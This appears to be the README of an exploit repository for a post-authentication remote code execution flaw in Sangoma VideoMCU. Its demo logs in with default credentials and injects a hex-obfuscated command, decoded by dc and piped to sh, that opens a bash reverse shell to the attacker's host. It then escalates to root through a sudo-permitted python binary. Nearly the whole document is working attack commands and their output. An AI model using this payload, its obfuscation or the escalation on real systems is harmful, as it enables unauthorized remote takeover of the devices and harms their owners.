# sangoma-videomcu-rce
Sangoma VideoMCU Post-Auth RCE.

Demo:
```
% python3 videomcu-postauth-rce.py http://192.168.0.210 192.168.0.55 1339 root sangoma
[+] Attempting to log into VideoMCU...
[*] Auth succeeded, we can proceed...
echo '16i 6E6F6875702062617368202D63202762617368202D69203E26202F6465762F7463702F3139322E3136382E302E35352F3133333920303E2631202627 P' | dc | sh
[*] Using 192.168.0.55:1339 for connectback...
[+] starting handler on port 1339
[+] Doing the command injection...
[*] Got connection from 192.168.0.210
[$] Shell popped :P
bash: no job control in this shell
bash-3.2$ id;uname -a;pwd
id;uname -a;pwd
uid=101(webconfig) gid=102(webconfig) groups=102(webconfig)
Linux videomcu 2.6.39-4.sng2 #1 SMP Wed Dec 21 17:26:48 EST 2011 i686 i686 i386 GNU/Linux
/var/webconfig/htdocs/admin
bash-3.2$ sudo /usr/local/videomcu/bin/python2.7 -c "import os;os.system('sh')"
sudo /usr/local/videomcu/bin/python2.7 -c "import os;os.system('sh')"
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
exit
bash-3.2$ exit
exit
exit
*** Connection closed by remote host ***

```
